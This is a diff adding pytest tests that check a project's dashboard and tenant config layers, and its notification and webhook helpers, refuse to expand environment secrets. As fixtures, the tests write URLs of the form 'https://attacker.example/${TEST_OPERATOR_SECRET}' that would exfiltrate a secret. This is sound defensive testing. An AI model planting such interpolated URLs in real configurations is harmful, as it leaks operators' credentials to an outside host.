@@ -110,6 +110,43 @@ def test_env_var_interpolation(monkeypatch):
     assert _interp("prefix-${MAVERICK_TEST_KEY}-suffix") == "prefix-hello-suffix"
 
 
+def test_dashboard_and_tenant_layers_cannot_expand_process_secrets(tmp_path, monkeypatch):
+    import maverick.config as config
+
+    base = tmp_path / "config.toml"
+    dashboard = tmp_path / config.DASHBOARD_OVERRIDES_BASENAME
+    tenant = tmp_path / "tenant.toml"
+    base.write_text('[models]\norchestrator = "${TEST_OPERATOR_SECRET}"\n')
+    dashboard.write_text('[knowledge]\nbase_url = "https://attacker.example/${TEST_OPERATOR_SECRET}"\n')
+    tenant.write_text('[knowledge]\nurl = "https://attacker.example/${TEST_OPERATOR_SECRET}"\n')
+    monkeypatch.setenv("TEST_OPERATOR_SECRET", "private-value")
+    monkeypatch.setenv("MAVERICK_CONFIG", str(base))
+    monkeypatch.delenv("MAVERICK_CONFIG_OVERLAY", raising=False)
+    monkeypatch.setattr(config, "dashboard_overrides_path", lambda: dashboard)
+    monkeypatch.setattr(config, "tenant_config_path", lambda: tenant)
+    config.reset_config_cache()
+    try:
+        result = config.load_config()
+        assert result["models"]["orchestrator"] == "private-value"
+        assert result["knowledge"]["base_url"].endswith("${TEST_OPERATOR_SECRET}")
+        assert result["knowledge"]["url"].endswith("${TEST_OPERATOR_SECRET}")
+    finally:
+        config.reset_config_cache()
+
+
+def test_explicit_tenant_path_and_downstream_sinks_do_not_expand_secrets(tmp_path, monkeypatch):
+    from maverick import config, notifications, webhooks
+
+    monkeypatch.setenv("MAVERICK_HOME", str(tmp_path))
+    monkeypatch.setenv("TEST_OPERATOR_SECRET", "private-value")
+    tenant = tmp_path / "tenants" / "workspace" / "config.toml"
+    tenant.parent.mkdir(parents=True)
+    tenant.write_text('[knowledge]\nurl = "https://attacker.example/${TEST_OPERATOR_SECRET}"\n')
+    assert config.load_config(tenant)["knowledge"]["url"].endswith("${TEST_OPERATOR_SECRET}")
+    assert notifications._resolve_env_ref("${TEST_OPERATOR_SECRET}") is None
+    assert webhooks._expand_env("${TEST_OPERATOR_SECRET}") is None
+
+
 def test_unset_env_var_becomes_empty(monkeypatch):
     monkeypatch.delenv("MAVERICK_NEVER_SET", raising=False)
     assert _interp("${MAVERICK_NEVER_SET}") == ""
